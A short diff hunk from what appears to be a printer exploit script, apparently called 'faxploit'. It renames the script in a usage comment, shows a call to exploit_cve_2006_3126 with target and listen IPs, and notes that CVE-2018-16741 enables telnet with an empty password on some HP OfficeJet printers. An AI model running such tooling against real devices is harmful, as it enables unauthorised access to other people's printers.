@@ -56,7 +56,7 @@ if args.cve_2006_3126:
     exploit_cve_2006_3126(target_ip, listen_ip)
     
     # Example Usage:
-    # python exploit.py -t 192.168.0.1 -l 10.0.0.1 -cve1
+    # python faxploit.py -t 192.168.0.1 -l 10.0.0.1 -cve1
     
     # Based on Known vulnerabilities 
     # CVE-2018-16741: a vulnerability found in certain HP OfficeJet printers that allows an attacker to enable telnet service with an empty password.
